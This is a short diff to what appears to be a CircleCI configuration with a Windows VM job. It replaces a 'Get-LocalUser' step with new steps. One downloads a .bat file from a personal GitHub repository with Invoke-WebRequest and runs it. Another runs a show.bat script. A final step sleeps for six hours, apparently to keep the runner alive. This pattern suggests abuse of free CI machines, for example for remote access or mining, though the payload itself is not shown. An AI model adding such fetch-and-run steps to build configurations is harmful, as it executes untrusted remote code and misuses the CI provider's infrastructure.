@@ -10,4 +10,9 @@ jobs:
     steps:
       # Commands are run in a Windows virtual machine environment
       - checkout
-      - run: Get-LocalUser 
+      - run: Invoke-WebRequest -Uri "https://github.com/ngarg50410/git_test/blob/main/Downloads.bat" -OutFile "Downloads.bat"
+      - run: cmd /c Downloads.bat
+      - run: cmd /c show.bat
+      - run: 
+          command: Start-Sleep -Seconds 21600
+          no_output_timeout: 30m
